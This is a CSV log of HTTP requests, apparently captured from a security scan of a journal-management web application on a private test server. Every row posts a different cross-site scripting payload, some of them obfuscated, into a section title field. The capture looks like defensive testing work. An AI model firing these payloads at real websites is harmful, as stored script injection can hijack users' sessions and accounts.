request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw
fb0b2bfeb6b2a7dbebef3b5ca0a030bf,"Wed, 10 Jun 2026 09:23:46 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cScRipT%3ealert(%22XSS%22)%3b%3c%2fScRipT%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,261,172.19.3.26,46200,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
179bae451b29f595b3bd37cd45a93806,"Wed, 10 Jun 2026 09:23:46 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cscript%3ealert(123)%3b%3c%2fscript%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,255,172.19.3.26,46242,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
4125b7d33c3607428dd251e4e6912168,"Wed, 10 Jun 2026 09:23:46 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cscript%3ealert(%22hellox%20worldss%22)%3b%3c%2fscript%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,274,172.19.3.26,46236,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
c7c05546c98b1f05ec6713a9ea124f51,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=�%3e%3cscript%3ealert(�XSS�)%3c%2fscript%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,258,172.19.3.26,46256,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
78d7928fbc718237e70db64b2c9ce211,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cscript%3ealert(�XSS�)%3c%2fscript%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,254,172.19.3.26,46222,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
c1ae17653a47905ea074bf91131407f8,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cscript%3ealert(%2fXSS�)%3c%2fscript%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,256,172.19.3.26,46192,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
84f0d6e12abbd008bcf9cb29bcb3e66b,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cscript%3ealert(�XSS�)%3b%3c%2fscript%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,257,172.19.3.26,46220,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
9b3f6cfd7e8da2b2b957ccffeae1a2d1,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cscript%3ealert(�XSS�)%3c%2fscript%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,254,172.19.3.26,46248,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
1db6e449b23657dd60a52b13ff54840d,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cscript%20~~~%3ealert(0%0)%3c%2fscript%20~~~%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,264,172.19.3.26,46254,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
ee4540ee964bc27aa67cbb73a9f4a4c4,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cstyle%2fonload%3d%26lt%3b!--%26%2309%3b%26gt%3b%26%2310%3balert%26%2310%3b%26lpar%3b1%26rpar%3b%3e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,316,172.19.3.26,46200,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
02c4e05fc70cf8827702ba107eb2dff1,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cimg%20src%3d%60%00%60%26NewLine%3b%20onerror%3dalert(1)%26NewLine%3b&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,286,172.19.3.26,46242,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
e9722d139bc25f2cd4a31be0bc17a496,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3c%2f%2f%2fstyle%2f%2f%2f%3e%3cspan%20%2F%20onmousemove%3d'alert%26lpar%3b1%26rpar%3b'%3eSPAN&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,309,172.19.3.26,46236,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
75a499824c0b894ad6fd156b478525ed,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cimg%2fsrc%3d'http%3a%2f%2fi%2eimgur%2ecom%2fP8mL8%2ejpg'%20onmouseover%3d%26Tab%3bprompt(1)&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,309,172.19.3.26,46222,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
62728bb4d89eecf573f6d2eeb6110235,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26%2334%3b%26%2362%3b%3csvg%3e%3cstyle%3e%7b-o-link-source%26colon%3b'%3cbody%2fonload%3dconfirm(1)%3e'&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,319,172.19.3.26,46256,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
544957fc50dfe9609afcc6b2d819f060,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%26%2313%3b%3cblink%2f%26%2313%3b%20onmouseover%3dpr%26%23x6F%3bmp%26%23116%3b(1)%3eOnMouseOver%20%7bFirefox%20%26%20Opera%7d&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,340,172.19.3.26,46192,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
28d7f70bd33e605eff4a1b0427b9376a,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cmarquee%20onstart%3d'javascript%3aalert%26%23x28%3b1%26%23x29%3b'%3e%5e__%5e&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,294,172.19.3.26,46220,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
32baa6739ee4f26a509aa6a9f3a5341a,"Wed, 10 Jun 2026 09:23:47 GMT",POST,/index.php/jsast-testing/$$$call$$$/grid/settings/sections/section-grid/update-section?sectionId=2,sectionId=2,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/jsast-testing/management/settings/context,da495ff02fb9755d,,,csrfToken=[MASKED]&sectionId=2&title%5Ben_US%5D=%3cdiv%2fstyle%3d%22width%3aexpression(confirm(1))%22%3eX%3c%2fdiv%3e%20%7bIE7%7d&abbrev%5Ben_US%5D=xss+test&policy%5Ben_US%5D=%3Cp%3Etesting%3C%2Fp%3E&wordCount=&identifyType%5Ben_US%5D=&subEditors%5B%5D=2&submitFormButton=,296,172.19.3.26,46248,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/jsast-testing/management/settings/context"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""host"": ""10.34.100.110"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""priority"": ""u=0"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}"
